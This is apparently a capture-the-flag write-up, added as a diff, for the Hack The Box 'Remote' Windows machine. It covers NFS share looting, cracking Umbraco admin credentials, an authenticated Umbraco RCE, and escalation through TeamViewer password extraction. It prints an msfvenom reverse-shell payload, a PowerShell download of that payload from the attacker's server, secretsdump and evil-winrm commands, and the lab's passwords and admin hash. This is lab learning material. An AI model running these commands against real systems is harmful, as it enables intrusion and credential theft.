@@ -1,0 +1,36 @@
+Form our inital nmap scan we have 21 (FTP), 80 (HTTP), 445 (SMB) and 2049(mountd)
+
+Anoymous login on port 21 (FTP)
+It seems we can actually login using anonymous:anonymous in the FTP port, but we can't even use 'ls' so it might be a rabbit hole.
+
+Enum and find services on port 80 ( HTTP/Web )
+Starting a recon in the background using 'seclists/Discovery/Web-Conent/big.txt' we get nothing interesting, only the linked pages that we've found on the web. Something stand up at first, which is on `/contact` and error message that `Umbraco Forms is required to render this form.`. If we follow the url redirection we get to a login page, found in `http://10.10.10.180/umbraco/`. Now we need to find the credentials.
+
+Listing shares on port 445 ( SMB )
+When we try to login using impacket's smbclient we actually get ACCESS_DENIED, so this seems also a rabbit hole.
+
+Exploiting the 2049 port ( mountd )
+At the first google search of this port we get an exploit. We can check is any share is available for mount using`showmount -e 10.10.10.180` and we actually have one, related to port 80, `/site_backups`.
+Let's mount it using `mount -t nfs 10.10.10.180:/site_backups ~/Documents/HackTheBox/Machines/Remote/site_backups/` and start the recon.
+Under `App_data/` we find this `Umbraco.sdf` which is binary, we can open it using `strings Umbraco.sdf |less`, but it actually have two password, for admin@local.htb and for ssmith. Actually, i didn't tried to crack the ssmith password, because while I was trying to figure it out, the admin cracked and I got `baconandcheese`.
+
+Login into umbraco and get the user shell on port 80.
+Going back to the login screen and using this credentials we actually get access to the whole admin panel. Now let's click on `Help` to get the version number. It seems it's `Umbraco version 7.12.4`. Doing a searchsploit on this we actually get that is vulnerable. `(Authenticated) Remote Code Execution`. We need to modify the exploit payload, username, password and host and we are in. My modified file can be found in `UmbracoRCE.py`. Now doing a simple run on it we get the user shell. To find the flag i've used `powershell.exe -c "Get-ChildItem -Path C:\ -Filter user.txt -Recurse -ErrorAction SilentlyContinue -Force"` it being under `C:\Users\Public\user.txt` 
+
+Working our way to root. 
+This box, if it wasn't Windows Server 2019, would be a JuicyPotato exploit because under `whoami /all` we actually have `SeImpersonatePrivilege` set to true, but this kernel has fixed the issue. 
+Looking more in depth in this box, using `tasklist` we have that `Team_Viewer_Service.exe` is running. There is a metasploit package `post/windows/gather/credentials/teamviewer_passwords` which might work. For that we need to upgrade to meterpreter shell, so we will generate the payload using `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.35 LPORT=1234 -f exe > shell.exe` and upload it to the box with `(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.35:8000/shell.exe', 'C:\Users\Public\shell.exe')`.
+Now that we have meterpreter, we can `background` and switch to the teamviewer exploit. After a couple of seconds we get a password, `!R3m0te!`, which it's worth trying to see if it's linked to the Administrator account. 
+
+We got the root, `evil-winrm -u Administrator --password '!R3m0te!' -i 10.10.10.180`.
+I will save the administrator hash for further usage, using `./secretsdump.py Administrator:'!R3m0te!'@10.10.10.180`. The output of this cmd can be found in `secretdump.info`
+
+Admin hash:
+-> aad3b435b51404eeaad3b435b51404ee:86fc053bc0b23588798277b22540c40c
+
+Credentials:
+-> admin@htb.local:baconandcheese
+-> Administrator:!R3m0te!
+
+Articles:
+-> https://resources.infosecinstitute.com/exploiting-nfs-share/#gref ( 2049 port exploit )
